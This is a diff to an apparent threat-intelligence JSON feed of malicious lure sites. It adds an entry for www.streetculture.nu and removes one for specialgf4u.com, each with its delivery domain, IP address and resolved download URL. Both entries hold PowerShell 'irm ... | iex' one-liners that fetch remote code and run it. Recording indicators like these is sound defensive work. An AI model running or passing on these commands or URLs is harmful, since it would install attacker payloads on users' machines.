@@ -1,5 +1,27 @@
 [
   {
+    "UrlDomain": "www.streetculture.nu",
+    "DeliveryUrl": [
+      "browse-login.info"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "128.140.220.78"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-login.info/96598984d8229501",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "irm 'browse-login[.]info/96598984d8229501'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-login.info/96598984d8229501"
+    ],
+    "ReportId": "cmwwqyouc07dh0omlolqmo2dw",
+    "ScannedAt": "2026-11-25T23:20:50.781000+00:00"
+  },
+  {
     "UrlDomain": "constanzaexclusive.com",
     "DeliveryUrl": [
       "browse-login.info"
@@ -11973,25 +11995,5 @@
     ],
     "ReportId": "cmwjyukd3198l0omlbovyvnwg",
     "ScannedAt": "2026-11-17T00:40:35.020000+00:00"
-  },
-  {
-    "UrlDomain": "specialgf4u.com",
-    "DeliveryUrl": [],
-    "PayloadUrl": [],
-    "IP": [
-      "187.17.111.35"
-    ],
-    "Related": [
-      {
-        "Value": "gitlab.com",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "IRM gitlab[.]com/dsy648ajd6ff/01a1e287-8de7-700c-802a-969604d519c9/-/raw/main/01a1e287-8de7-700c-802a-9696051416d5 | IEX",
-    "ResolvedDownloadUrl": [
-      "https://gitlab.com/dsy648ajd6ff/01a1e287-8de7-700c-802a-969604d519c9/-/raw/main/01a1e287-8de7-700c-802a-9696051416d5"
-    ],
-    "ReportId": "cmwjvzcgx19280omlttmi8ydj",
-    "ScannedAt": "2026-11-16T23:20:19.248000+00:00"
   }
 ]
